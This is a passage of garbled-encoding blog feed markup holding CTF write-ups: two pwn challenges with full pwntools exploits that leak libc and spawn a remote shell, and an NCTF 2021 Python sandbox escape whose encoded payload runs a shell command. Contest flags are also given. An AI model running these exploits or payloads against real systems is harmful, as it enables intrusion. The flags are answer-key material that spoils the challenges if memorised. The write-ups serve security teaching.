<code>0.Flag:10000$</code>ï¼Œè¾“å…¥æ•°é‡111111111ï¼Œå¾—åˆ°flagï¼š<code>flag&#123;Pwn_Is_Vary_Ez&#125;</code>ã€‚</p><h3 id="justdoit"><a href="#justdoit" class="headerlink" title="justdoit"></a>justdoit</h3><blockquote><p>nc 47.106.172.144 65004</p></blockquote><p>IDAåˆ†æï¼Œ<code>main()</code> å‡½æ•°ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hi there! What is your name? &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x18</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;That is an interesting chall&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;where are you from? my frends??&quot;</span>);</span><br><span class="line">  read_long();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>read_long()</code> å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">read_long</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x13</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> atol(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»ä»£ç çœ‹ä¸å‡ºæœ‰ä»€ä¹ˆåˆ©ç”¨ä¹‹å¤„ï¼Œåˆ‡æ¢å›æ±‡ç¼–è§†å›¾ï¼Œå‘ç° <code>read_long()</code> å‡½æ•°åœ¨è¿”å›raxå€¼æ—¶ï¼Œrbpå­˜åœ¨ä¸€ä¸ªåŠ æ“ä½œï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004011D5 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00000000004011D5                 public main</span><br><span class="line">.text:00000000004011D5 main            proc near               ; DATA XREF: _start+21â†‘o</span><br><span class="line">.text:00000000004011D5</span><br><span class="line">.text:00000000004011D5 buf             = byte ptr -20h</span><br><span class="line">.text:00000000004011D5</span><br><span class="line">.text:00000000004011D5 ; __unwind &#123;</span><br><span class="line">.text:00000000004011D5                 push    rbp</span><br><span class="line">.text:00000000004011D6                 mov     rbp, rsp</span><br><span class="line">.text:00000000004011D9                 sub     rsp, 20h</span><br><span class="line">.text:00000000004011DD                 mov     eax, 0</span><br><span class="line">.text:00000000004011E2                 call    init</span><br><span class="line">.text:00000000004011E7                 lea     rax, format     ; &quot;Hi there! What is your name? &quot;</span><br><span class="line">.text:00000000004011EE                 mov     rdi, rax        ; format</span><br><span class="line">.text:00000000004011F1                 mov     eax, 0</span><br><span class="line">.text:00000000004011F6                 call    _printf</span><br><span class="line">.text:00000000004011FB                 lea     rax, [rbp+buf]</span><br><span class="line">.text:00000000004011FF                 mov     edx, 18h        ; nbytes</span><br><span class="line">.text:0000000000401204                 mov     rsi, rax        ; buf</span><br><span class="line">.text:0000000000401207                 mov     edi, 0          ; fd</span><br><span class="line">.text:000000000040120C                 call    _read</span><br><span class="line">.text:0000000000401211                 lea     rax, s          ; &quot;That is an interesting chall&quot;</span><br><span class="line">.text:0000000000401218                 mov     rdi, rax        ; s</span><br><span class="line">.text:000000000040121B                 call    _puts</span><br><span class="line">.text:0000000000401220                 lea     rax, aWhereAreYouFro ; &quot;where are you from? my frends??&quot;</span><br><span class="line">.text:0000000000401227                 mov     rdi, rax        ; format</span><br><span class="line">.text:000000000040122A                 mov     eax, 0</span><br><span class="line">.text:000000000040122F                 call    _printf</span><br><span class="line">.text:0000000000401234                 mov     eax, 0</span><br><span class="line">.text:0000000000401239                 call    read_long</span><br><span class="line">.text:000000000040123E                 add     rbp, rax           ; åŠ æ“ä½œ</span><br><span class="line">.text:0000000000401241                 mov     eax, 0</span><br><span class="line">.text:0000000000401246                 leave</span><br><span class="line">.text:0000000000401247                 retn</span><br><span class="line">.text:0000000000401247 ; &#125; // starts at 4011D5</span><br><span class="line">.text:0000000000401247 main            endp</span><br></pre></td></tr></table></figure><p>æ¥ç€çš„ <code>leave</code> æ˜¯ <code>mov rsp,rbp; pop rbp</code>ï¼Œrspå°†å˜ä¸ºrbp+raxï¼Œæ§åˆ¶raxä¸º-0x20-8ï¼Œç»“åˆ <code>leave</code> æ“ä½œå¯ä»¥å°†rspç§»åŠ¨åˆ° <code>buf</code> å¤„ä»¥å†™å…¥ROPé“¾ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = context.binary = ELF(<span class="string">&#x27;./justdoit.1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;47.106.172.144&#x27;</span>, <span class="number">65004</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = binary.search(asm(<span class="string">&#x27;pop rdi; ret;&#x27;</span>)).__next__()</span><br><span class="line">pop2 = binary.search(asm(<span class="string">&#x27;pop r14; pop r15; ret;&#x27;</span>)).__next__()</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += p64(binary.sym.main)</span><br><span class="line">payload += p64(binary.plt.puts)</span><br><span class="line">payload += p64(binary.sym.main)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;name? &#x27;</span>, payload)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;frends??&#x27;</span>, <span class="string">b&#x27;-40&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binary.got.puts)</span><br><span class="line">payload += p64(pop2)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;name? &#x27;</span>, payload)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;frends??&#x27;</span>, <span class="string">b&#x27;-40&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>) + <span class="string">b&#x27;\0\0&#x27;</span>) - libc.sym.puts</span><br><span class="line">log.info(<span class="string">&#x27;libc.address: &#x27;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__())</span><br><span class="line">payload += p64(libc.sym.system)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;name? &#x27;</span>, payload)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;frends??&#x27;</span>, <span class="string">b&#x27;-40&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>flagï¼š<code>ctf&#123;01241e36-ea17-4bed-b620-f64f10e5c192&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="reallNeedGoodLuck"><a href="#reallNeedGoodLuck" class="headerlink" title="reallNeedGoodLuck"></a>reallNeedGoodLuck</h3><blockquote><p>nc 47.106.172.144 65003</p></blockquote><p>IDAåˆ†æï¼Œ<code>main()</code> å‡½æ•°ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v3; <span class="comment">// [rsp+0h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">int</span> buf; <span class="comment">// [rsp+Ch] [rbp-24h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> nptr[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;need&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;good&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">4uLL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;luck! &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, nptr, <span class="number">9uLL</span>);</span><br><span class="line">  v3 = (_DWORD *)atoi(nptr);</span><br><span class="line">  *v3 = buf;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>buf</code> å’Œ <code>nptr</code> éƒ½æ— æº¢å‡ºç‚¹ï¼Œä½†å¯ä»¥å‘ <code>buf</code> å†™å…¥4å­—èŠ‚å¹¶è¦†ç›–æ‰å†™å…¥<code>nptr</code>ä¸­å€¼å¯¹åº”åœ°å€çš„å†…å®¹ã€‚</p><p>å¯ä»¥ä»»æ„åœ°å€å†™ï¼Œè€ƒè™‘å°† <code>atoi</code> æ”¹ä¸ºlibcä¸­çš„ <code>system</code>ï¼Œå†å‘ <code>system</code> ä¼ å…¥ <code>/bin/sh\x00</code> å³å¯getshellï¼Œä¸ºè¾¾æˆä¸¤æ­¥åˆ©ç”¨ï¼Œè¿˜éœ€å°† <code>exit</code> æ”¹ä¸º <code>main</code> åœ°å€ã€‚</p><p><code>atoi</code> ä¸<code>system</code> çš„åç§»åªæœ‰æœ€å2å­—èŠ‚ä¸åŒï¼Œåˆç”±äºASLRå¼€å¯ï¼Œå1.5å­—èŠ‚ä¸º0ï¼Œæ‰€ä»¥æœ‰0.5/8=1/16çš„å‡ ç‡èƒ½å°† <code>atoi</code> æ”¹ä¸º <code>system</code>ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = context.binary = ELF(<span class="string">&#x27;./reallNeedGoodLuck.1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;WARN&#x27;</span></span><br><span class="line"></span><br><span class="line">attempt = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = remote(<span class="string">&#x27;47.106.172.144&#x27;</span>, <span class="number">65003</span>)</span><br><span class="line">        libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">        tout = <span class="number">1.0</span></span><br><span class="line"></span><br><span class="line">        attempt += <span class="number">1</span></span><br><span class="line">        log.warn(<span class="string">&#x27;attempt: &#x27;</span> + <span class="built_in">str</span>(attempt))</span><br><span class="line"></span><br><span class="line">        p.sendafter(<span class="string">b&#x27;good\n&#x27;</span>,p32(binary.sym.main))</span><br><span class="line">        p.sendafter(<span class="string">b&#x27;luck! \n&#x27;</span>,<span class="built_in">str</span>(binary.got.exit).encode())</span><br><span class="line"></span><br><span class="line">        p.sendafter(<span class="string">b&#x27;good\n&#x27;</span>,p32(((libc.sym.system | <span class="number">0xf000</span>) &amp; <span class="number">0xffff</span>) &lt;&lt; <span class="number">16</span>))</span><br><span class="line">        p.sendafter(<span class="string">b&#x27;luck! \n&#x27;</span>,<span class="built_in">str</span>(binary.got.atoi - <span class="number">2</span>).encode())</span><br><span class="line"></span><br><span class="line">        p.sendafter(<span class="string">b&#x27;good\n&#x27;</span>,<span class="string">b&#x27;0000&#x27;</span>,timeout=tout)</span><br><span class="line">        p.sendafter(<span class="string">b&#x27;luck! \n&#x27;</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>,timeout=tout)</span><br><span class="line"></span><br><span class="line">        p.sendline(<span class="string">b&#x27;echo test&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;test&#x27;</span> <span class="keyword">in</span> p.recvline(timeout=tout):</span><br><span class="line">            p.interactive()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> AssertionError <span class="keyword">as</span> err:</span><br><span class="line">        <span class="built_in">print</span>(err)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p.close()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p>flagï¼š<code>ctf&#123;8b1bf41f-8b38-4487-86ae-a5df4fa4c85e&#125;</code>ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;â€‹    &lt;/p&gt;
&lt;p&gt;ç”±å¤§è¿å¸‚å…¬å®‰å±€ä½œä¸ºæŒ‡å¯¼å•ä½ï¼Œå¤§è¿ä¸œè½¯ä¿¡æ¯å­¦é™¢ä¸»åŠï¼Œç½‘ç»œå®‰å…¨å·¥ä½œå®¤æ‰¿åŠï¼Œå¤§è¿ä¸œè½¯ä¿¡æ¯å­¦é™¢ç½‘ç»œä¸ä¿¡æ¯ä¸­å¿ƒã€è®¡ç®—æœºå­¦é™¢ã€è½¯ä»¶å­¦é™¢ï¼Œå“ç‰Œå‘å±•éƒ¨ã€å¾®å…‰ç½‘ç»œå·¥ä½œå®¤ååŠï¼Œå“ç‰Œå‘å±•éƒ¨ä¸å¾®å…‰ç½‘ç»œå·¥ä½œå®¤æä¾›è®¾è®¡æ”¯æŒï¼Œå¤§è¿æš—æ³‰ä¿¡æ¯æŠ€æœ¯æœ‰é™å…¬å¸èµåŠ©æ”¯æŒçš„â€œæš—æ³‰æ¯â€ç½‘ç»œå®‰å…¨</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2021èµ›" scheme="https://lazzzaro.github.io/tags/2021%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>NCTF 2021</title>
    <link href="https://lazzzaro.github.io/2021/11/28/match-NCTF-2021/"/>
    <id>https://lazzzaro.github.io/2021/11/28/match-NCTF-2021/</id>
    <published>2021-11-28T12:53:29.000Z</published>
    <updated>2021-11-28T19:29:51.642Z</updated>
    
    <content type="html"><![CDATA[<p>â€‹    </p><ul><li>æ¯”èµ›æ—¶é—´ï¼š2021.11.27 9:00-2021.11.28 21:00</li><li>æ¯”èµ›åŒºåˆ†æ ¡å†…æ ¡å¤–ï¼Œæ¯”èµ›ç»“æŸåç»“ç®—åˆ†åˆ«æ’åï¼Œæ¯”èµ›æ—¶æ’è¡Œæ¦œä¸åŒºåˆ†</li><li>æ³¨å†Œé˜Ÿä¼ç™»é™†åï¼Œè¯·åœ¨Profileé¡µé¢ç»‘å®šé˜Ÿä¼æˆå‘˜ä¿¡æ¯</li><li>æ¯æ”¯é˜Ÿä¼è‡³å°‘ç»‘å®šä¸€ä¸ªæˆå‘˜ï¼Œä¸è¶…è¿‡4äººï¼Œæ ¡å†…é˜Ÿä¼æ‰€æœ‰æˆå‘˜è¯·å¡«å†™<strong>çœŸå®å§“å</strong>å’Œæ­£ç¡®<strong>å­¦å·</strong>ï¼Œæ ¡å¤–é˜Ÿä¼è‡³å°‘ç»‘å®šä¸€ä¸ªæˆå‘˜ï¼Œä»¥ä¾¿é¢å¥–æ—¶è”ç³»ã€‚</li><li>æœªç»‘å®šæˆå‘˜ä¿¡æ¯çš„é˜Ÿä¼å¯ä»¥æ­£å¸¸è§£é¢˜ä½†ä¸å‚ä¸æ’å</li><li>æˆå‘˜ä¿¡æ¯ä¸€ç»ç»‘å®šä¸å¯æ›´æ”¹</li><li>ç¦æ­¢å¯¹å¹³å°è¿›è¡Œæ”»å‡»</li><li>ç¦æ­¢ä¸å…¶ä»–é˜Ÿä¼äº¤æµè§£é¢˜æ€è·¯</li><li>è¯·åœ¨æ¯”èµ›ç»“æŸå12å°æ—¶å†…å‘é€è¯¦ç»†è§£é¢˜æ€è·¯ï¼ˆpdfæ ¼å¼ï¼‰åˆ°é‚®ç®±nctf@h4ck.fun</li></ul><p>Rank: 10</p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h3><blockquote><p>find it</p></blockquote><p>ç­¾åˆ°ï¼Œ<code>https://nctf.h4ck.fun/challenges/NCTF%7BWelcome_to_NCTF_2021!%7D</code>ï¼Œé“¾æ¥å°±æœ‰flagï¼š<code>NCTF&#123;Welcome_to_NCTF_2021!&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="Hexé…±çš„ç§˜å¯†èŠ±å›­"><a href="#Hexé…±çš„ç§˜å¯†èŠ±å›­" class="headerlink" title="Hexé…±çš„ç§˜å¯†èŠ±å›­"></a>Hexé…±çš„ç§˜å¯†èŠ±å›­</h3><blockquote><p>æˆ‘ä»¬å¯çˆ±çš„Hexé…±åˆæœ‰äº†ä¸€ä¸ªå¼ºå¤§çš„åŠŸèƒ½ï¼Œå¯ä»¥å»æ‰§è¡Œå¤šè¡Œè¯­å¥æƒ¹~<br>ä½†æ˜¯ä¸ºäº†é˜²æ­¢æœ‰äº›å±…å¿ƒåµæµ‹çš„äººï¼Œæˆ‘ä»¬ä¸“é—¨ æŠŠæ‹¬å·ï¼Œå•åŒå¼•å·ï¼Œéƒ½è¿‡æ»¤æ‰ï¼Œå™¢å¯¹ä¸å‡†è‰²è‰²ï¼Œæ‰€ä»¥ä¹Ÿä¸å‡†å‡ºç°hå“Ÿ~<br>Ubuntu Python3.6.9<br>å¿«å»æ‰¾Hexé…±(QQ:2821876761)ç§èŠå§<br>ç§èŠå‘é€çš„ä¿¡æ¯ä¸ºæ˜æ–‡ï¼Œä¸éœ€è¦åŠ base64</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line">code = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    data = b64decode(code.encode()).decode()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&#x27;h&quot;\&#x27;(&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> c <span class="keyword">in</span> data: exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span>(data)</span><br></pre></td></tr></table></figure></blockquote><p>æŒºæœ‰è¶£çš„ç»“åˆäº†QQBotçš„pythoné€ƒé€¸ï¼Œç”±ä»£ç çŸ¥éœ€ä¼ å…¥pythonä»£ç æ®µï¼Œä¸èƒ½åŒ…å«æ‹¬å·ã€å•åŒå¼•å·å’Œå­—æ¯hï¼Œæœ€å<code>exec</code> å‡½æ•°æ‰§è¡Œã€‚</p><p>æ–­æ‰äº† <code>print()</code> å’Œ <code>help()</code> è¾“å‡ºæ–¹å¼ï¼Œå¯ä»¥é‡‡ç”¨pythonä¸­çš„è¯­æ³•ç³– <code>@</code> ç±»è£…é¥°å™¨ï¼Œåœ¨åˆ›å»ºç±»æ—¶è§¦å‘è£…é¥°å™¨ä¸­çš„ä»£ç é€»è¾‘ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">x=<span class="number">95</span>,<span class="number">95</span>,<span class="number">105</span>,<span class="number">109</span>,<span class="number">112</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">95</span>,<span class="number">95</span>,<span class="number">40</span>,<span class="number">39</span>,<span class="number">111</span>,<span class="number">115</span>,<span class="number">39</span>,<span class="number">41</span>,<span class="number">46</span>,<span class="number">112</span>,<span class="number">111</span>,<span class="number">112</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">40</span>,<span class="number">39</span>,<span class="number">99</span>,<span class="number">97</span>,<span class="number">116</span>,<span class="number">32</span>,<span class="number">47</span>,<span class="number">104</span>,<span class="number">111</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">47</span>,<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">39</span>,<span class="number">41</span>,<span class="number">46</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">97</span>,<span class="number">100</span>,<span class="number">40</span>,<span class="number">41</span></span><br><span class="line">y=<span class="keyword">lambda</span> z:x</span><br><span class="line"><span class="meta">@print</span></span><br><span class="line"><span class="meta">@eval</span></span><br><span class="line"><span class="meta">@bytes</span></span><br><span class="line"><span class="meta">@y</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">z</span>:</span></span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#__import__(&#x27;os&#x27;).popen(&#x27;cat /home/flag&#x27;).read()</span></span><br></pre></td></tr></table></figure><p>Botè¿”å›flagï¼š<code>NCTF&#123;HexQBot_1s_s0_cut3~&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="åšé¢˜åšç´¯äº†æ¥ç©ç©æ¸¸æˆå§"><a href="#åšé¢˜åšç´¯äº†æ¥ç©ç©æ¸¸æˆå§" class="headerlink" title="åšé¢˜åšç´¯äº†æ¥ç©ç©æ¸¸æˆå§"></a>åšé¢˜åšç´¯äº†æ¥ç©ç©æ¸¸æˆå§</h3><blockquote><p>åšäº†ä¸€å¤©çš„é¢˜ç›®ï¼Œéƒ½ç´¯äº†å§ï¼Œå¿«æ¥ç©ç©æˆ‘æ–°å†™çš„é£æœºå¤§æˆ˜å§ï¼Œåªè¦é€šå…³å°±èƒ½è·å¾—flagå“Ÿï½<br>å¯¹äº†ï¼Œå¦‚æœä½ çœŸçš„æƒ³ç©æ¸¸æˆï¼Œä¹Ÿè®¸ä½ éœ€è¦ä¸€ä¸ªmacï¼ŒIntelå’ŒApple siliconèŠ¯ç‰‡éƒ½æ”¯æŒ</p></blockquote><p>Unity3D æ¸¸æˆï¼Œä¸»é€»è¾‘éƒ½åœ¨ <code>Assembly-CSarp.dll</code> ä¸­ï¼Œæ‰¾åˆ°æ–‡ä»¶ï¼š</p><p><code>PlaneFire.app/Contents/Resources/Data/Managed/Assembly-CSharp.dll</code></p><p>ç”¨ILSpyæŸ¥çœ‹dllç¨‹åºé€»è¾‘ï¼Œå‘ç°æœ€ç»ˆé€šè¿‡è®¿é—® <code>http://h4ck.fun/g4me.txt</code> è·å–flagï¼š<code>NCTF&#123;B9F3C1F2-1E65-481C-8AF3-A78FA7A5EB6A&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="é—®å·é¢˜"><a href="#é—®å·é¢˜" class="headerlink" title="é—®å·é¢˜"></a>é—®å·é¢˜</h3><blockquote><p>é—®å·é“¾æ¥ï¼š<a href="https://forms.gle/RcKhJo2uQwQrL4Gu9">https://forms.gle/RcKhJo2uQwQrL4Gu9</a><br>æç¤ºï¼šæ˜¯Googleé—®å·</p></blockquote><p>ç­¾é€€ï¼Œç­”å®Œå°±æœ‰flagï¼š<code>NCTF&#123;Thank_y0u_for_your_participation&#125;</code>ã€‚</p><p>â€‹    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="dsa"><a href="#dsa" class="headerlink" title="dsa"></a>dsa</h3><blockquote><p>flagæ ¼å¼nctf{.*}ï¼Œé¢˜ç›®è§é™„ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span 